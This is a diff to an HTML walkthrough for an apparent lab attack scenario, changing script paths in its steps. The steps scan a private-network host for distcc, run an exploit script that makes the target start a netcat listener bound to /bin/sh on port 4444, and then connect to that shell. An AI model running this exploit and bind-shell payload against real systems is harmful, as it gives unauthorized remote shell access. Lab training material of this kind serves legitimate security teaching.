@@ -26,8 +26,7 @@
 
     <h3>1. Start the Scenario</h3>
     <p>Ensure the scenario environment is running by executing the following command in your terminal:</p>
-    <pre><code>cd attacker_scenario_2
-./attacker_scenario_2/scenario.sh start</code></pre>
+    <pre><code>./attacker_scenario_2/scenario.sh start</code></pre>
 
     <h3>2. Service Identification</h3>
     <p>Scan the target to find the <i>distcc</i> service: <code>nmap -Pn -sV -p3632 172.30.0.30</code></p>
@@ -43,7 +42,7 @@
 
     <h3>4. Trigger the Exploit</h3>
     <p>We will use the Python script provided in this directory to send a malicious command to the <code>distcc</code> service. This command will tell the target to start a listener on port 4444 and attach a shell to it.</p>
-    <p>Execute the following in your terminal: <code>python3 exploit_distcc.py 172.30.0.30 "nohup nc -l -p 4444 -e /bin/sh >/dev/null 2>&1 &"</code></p>
+    <p>Execute the following in your terminal: <code>python3 ./attacker_scenario_2/exploit_distcc.py 172.30.0.30 "nohup nc -l -p 4444 -e /bin/sh >/dev/null 2>&1 &"</code></p>
     <p><i>Note: We use <code>nohup</code> and the <code>&</code> symbol to ensure the netcat listener continues to run in the background on the target even after our exploit script finishes its task.</i></p>
 
     <h3>5. Connecting to the Shell</h3>
